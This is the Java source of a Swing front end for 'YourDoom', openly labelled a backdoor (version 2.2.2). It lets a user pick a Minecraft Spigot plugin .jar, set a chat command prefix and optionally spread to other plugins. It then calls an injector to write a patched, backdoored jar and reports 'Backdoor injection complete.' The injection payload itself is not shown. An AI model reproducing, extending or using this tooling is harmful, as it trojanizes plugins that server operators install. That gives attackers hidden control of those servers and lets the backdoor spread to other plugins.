package com.thiccindustries.debugger;

import javax.swing.*;
import javax.swing.filechooser.FileFilter;
import java.io.File;
import com.formdev.flatlaf.FlatDarkLaf;

public class InjectorGUI{

    public static void main(String[] args){
        try {
            UIManager.setLookAndFeel(new FlatDarkLaf());
        }catch(Throwable ignored){}

        int result = 999;
        while(result != JOptionPane.YES_OPTION) {
            /*--- Home dialog ---*/
            String[] options = {"Inject", "About", "Close"};
            result = JOptionPane.showOptionDialog(
                    null,
                    "YourDoom\n" +
                            "Requirements:\n" +
                            "   * Target plugin .jar file",
                    "YourDoom",
                    JOptionPane.YES_NO_CANCEL_OPTION,
                    JOptionPane.PLAIN_MESSAGE,
                    null,       //no custom icon
                    options,        //button titles
                    options[0]      //default button
            );

            if (result == JOptionPane.NO_OPTION) {
                JOptionPane.showMessageDialog(
                        null,
                        "Created by: YourDoom,\n" +
                                "Backdoor Version: 2.2.2\n" +
                                "Release Date: March 25 2022\n" +
                                "License: GPL v3.0",
                        "YourDoom",
                        JOptionPane.INFORMATION_MESSAGE
                );
            }

            if(result == JOptionPane.CANCEL_OPTION)
                return;
        }

        /*--- Get Files ---*/
        JFileChooser fc = new JFileChooser();
        fc.setFileFilter(new FileFilter() {
            @Override
            public boolean accept(File file) {
                return file.getName().endsWith(".jar") || file.isDirectory();
            }

            @Override
            public String getDescription() {
                return "Spigot Plugin File (*.jar)";
            }
        });

        int result1 = fc.showOpenDialog(null);

        //Out dialog cancelled
        if(result1 != JFileChooser.APPROVE_OPTION)
            return;

        String InPath = fc.getSelectedFile().getPath();

        int sep = InPath.lastIndexOf(".");
        String OutPath = InPath.substring(0, sep) + "-patched.jar";

        /*--- Query options ---*/
        String ChatPrefix;
        Boolean InjectOther;
        Boolean Warnings;
        ChatPrefix = (String)JOptionPane.showInputDialog(
                null,
                "Chat Command Prefix:",
                "YourDoom",
                JOptionPane.PLAIN_MESSAGE,
                null,
                null,
                "fPr>"
        );

        //No input
        if(ChatPrefix.isEmpty())
            return;

        InjectOther = JOptionPane.showConfirmDialog(
                null,
                "Inject to other plugins?\n[This feature is experimental!]",
                "YourDoom",
                JOptionPane.YES_NO_OPTION
        ) == JOptionPane.YES_OPTION;

        Warnings = JOptionPane.showConfirmDialog(
                null,
                "Enable Debug Messages?\n[Usually unwanted except for testing purposes]",
                "YourDoom",
                JOptionPane.YES_NO_OPTION
        ) == JOptionPane.YES_OPTION;
        //Parse uuids

        Injector.SimpleConfig sc = new Injector.SimpleConfig(ChatPrefix, InjectOther, Warnings);
        boolean result2 = Injector.patchFile(InPath, OutPath, sc, true, false);

        if(result2){
            JOptionPane.showMessageDialog(null, "Backdoor injection complete.", "YourDoom", JOptionPane.INFORMATION_MESSAGE);
        }else{
            JOptionPane.showMessageDialog(null, "Backdoor injection failed.", "YourDoom", JOptionPane.ERROR_MESSAGE);
        }
    }

    public static void displayError(String message){
        JOptionPane.showMessageDialog(null, message, "YourDoom", JOptionPane.ERROR_MESSAGE);
    }
}
